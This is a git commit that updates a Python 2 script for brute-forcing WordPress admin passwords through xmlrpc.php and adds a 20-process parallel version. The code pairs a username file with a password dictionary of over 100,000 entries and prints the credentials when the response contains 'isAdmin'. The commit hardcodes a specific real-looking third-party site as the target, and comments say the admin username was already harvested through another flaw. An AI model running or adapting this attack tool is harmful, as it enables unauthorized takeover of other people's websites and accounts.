d52b112fc8bab4eec1e8cae6621fdcff77ea96a6
bolin <1285974993@qq.com>
2022-10-19 02:56:05 +0800

    更新

--- trunk/xmlrpc/xmlrpc.py
+++ trunk/xmlrpc/xmlrpc.py
@@ -2,8 +2,11 @@
 '''
 漏洞详情请查看：http://www.freebuf.com/articles/web/38861.html
 '''
+import datetime
 import urllib2
 import re
+
+
 
 def ReadMe():
     print """说明：
@@ -11,64 +14,77 @@ def ReadMe():
     2.按提示输入WordPress站点(例如:www.freebuf.com)
     """
 
+
 def GetUrl():
-    urlinput=raw_input("请输入wordpress站点:")
-    requrl="http://"+re.match(r"(http://)?(.*)",urlinput).expand('\g<2>')+"/xmlrpc.php"
-    print "尝试利用:"+requrl
+    # urlinput=raw_input("请输入wordpress站点:")
+    # requrl="http://"+re.match(r"(http://)?(.*)",urlinput).expand('\g<2>')+"/xmlrpc.php"
+    requrl = "http://www.gmcdz.cn/xmlrpc.php"
+    print "尝试利用:" + requrl
     return requrl
-   
+
+
 def Aviable(requrl):
-    
     try:
         result = urllib2.urlopen(url=requrl).read()
     except urllib2.URLError:
         print "抱歉，此站点漏洞不可用"
         return False
-    else :
+    else:
         if result == "XML-RPC server accepts POST requests only.":
             print "\n该站点存在此漏洞,尝试破解中:"
             return True
-        else :
+        else:
             print "抱歉，此站点漏洞不可用"
-            print "网页返回：\n    "+result
+            print "网页返回：\n    " + result
             return False
-    
+
+
 def Exploit():
-    requrl=GetUrl()
-    if Aviable(requrl) :
-    #usernames.txt 文件中其实只有一个用户名，因为我们通过author漏洞获取到了管理的用户名。
-        f_username=open("usernames.txt","r")
-        f_password=open("passwords.txt","r")
-        num=0
-        Flag=0
-        for name in f_username:
-            if Flag == 1:
+    requrl = GetUrl()
+    # if Aviable(True) :
+    # usernames.txt 文件中其实只有一个用户名，因为我们通过author漏洞获取到了管理的用户名。
+    f_username = open("usernames.txt", "r")
+    f_password = open("passwords.txt", "r")
+    num = 0
+    Flag = 0
+    for name in f_username:
+        a = datetime.datetime.now()
+        if Flag == 1:
+            break
+        for key in f_password:
+            if num % 10 == 0:
+                b = datetime.datetime.now()
+                print "已尝试" + str(num) + "个"
+                print (b-a).seconds
+            if len(key) < 8:
+                continue  # wordpress管理员密码长度最短是8  所以这里小于8的跳过
+            reqdata = '<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs\
+                        </methodName><params><param><value>' + name + \
+                      '</value></param><param><value>' + key + \
+                      '</value></param></params></methodCall>'
+            req = urllib2.Request(url=requrl, data=reqdata)
+            result = urllib2.urlopen(req).read()
+            num = num + 1
+            # if "isAdmin" in result:
+            if result.find("isAdmin") != -1:
+                print result.find("isAdmin")
+                print "Got it !"
+                print "username :" + name + "password :" + key
+                print "返回值" + result
+                Flag = 1
                 break
-            for key in f_password:
-                if num % 10 == 0:
-                    print "已尝试"+str(num)+"个"
-                if len(key)<8:
-                    continue #wordpress管理员密码长度最短是8  所以这里小于8的跳过
-                reqdata='<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs\
-                        </methodName><params><param><value>'+ name + \
-                        '</value></param><param><value>'+ key  +\
-                        '</value></param></params></methodCall>'
-                req = urllib2.Request(url=requrl,data=reqdata)
-                result = urllib2.urlopen(req).read()
-                num=num+1
-                if "isAdmin" in result :
-                    print "Got it !"
-                    print "username :"+name+"password :"+key
-                    Flag = 1
-                    break
-                    
-                elif "faultString" and "403" in result :
-                    continue 
-                    
-                else :
-                    print "Unknown error"
-        print "抱歉，在此字典中并未找到正确的密码"
-        
-if __name__ == '__main__' :
+
+            # elif "faultString" and "403" in result:
+            #     print "key:" + key
+            #     continue
+
+            else:
+                print "key:" + key
+                # print "Unknown error"
+                # print "返回值"+result
+    print "抱歉，在此字典中并未找到正确的密码"
+
+
+if __name__ == '__main__':
     ReadMe()
     Exploit()
---
+++ trunk/xmlrpc/xmlrpc_1.0.py
@@ -0,0 +1,75 @@
+# -*- coding: utf-8 -*-
+import time
+from multiprocessing import Process, Queue
+import datetime
+import urllib2
+
+a = datetime.datetime.now()
+Flag=0
+
+# 生产者
+def production(q):
+    f_password = open("passwords.txt", "r")
+    i = 0
+    for key in f_password:
+        i = i + 1
+        q.put(key)
+        print "队列第" + str(i) + "个数："
+
+
+# 消费者
+def consumption(q, uid):
+    global Flag
+    requrl = "http://www.gmcdz.cn/xmlrpc.php"
+    # usernames.txt 文件中其实只有一个用户名，因为我们通过author漏洞获取到了管理的用户名。
+    f_username = open("usernames.txt", "r")
+    for name in f_username:
+        for i in range(q.qsize()):
+            if Flag == 1:
+                break
+            # 消费一个队列
+            key = q.get()
+            reqdata = '<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs\
+                            </methodName><params><param><value>' + name + \
+                      '</value></param><param><value>' + key + \
+                      '</value></param></params></methodCall>'
+            req = urllib2.Request(url=requrl, data=reqdata)
+            result = urllib2.urlopen(req).read()
+            if result.find("isAdmin") != -1:
+                print result.find("isAdmin")
+                print "Got it !"
+                print "username :" + name + "password :" + key
+                print "返回值" + result
+                Flag = 1
+                break
+
+            # elif "faultString" and "403" in result:
+            #     print "key:" + key
+            #     continue
+
+            else:
+                b = datetime.datetime.now()
+                print "时间:" + str((b - a).seconds) + ",消费key：" + str(107592 - q.qsize())+ ",进程序号:" + str(uid) + ",剩余key:" + str(q.qsize()) + ",key:" + key
+                # print "时间:" + str((b - a).seconds)
+                # print "进程序号:" + str(uid)
+                # print "剩余key:" + str(q.qsize())
+                # print "key:" + key
+                # print "消费key："+str(107592-q.qsize())
+    print "抱歉，在此字典中并未找到正确的密码"
+
+
+if __name__ == '__main__':
+    # 创建队列
+    q = Queue()
+    # 创建生产者，将所有密码加入队列中
+    p = Process(target=production, args=(q,))
+    # 设置守护进程
+    # p.daemon = True
+    # 开始生产
+    p.start()
+    time.sleep(15)
+    for uid in range(20):
+        # 创建消费者
+        c = Process(target=consumption, args=(q, uid))
+        # 开始消费
+        c.start()
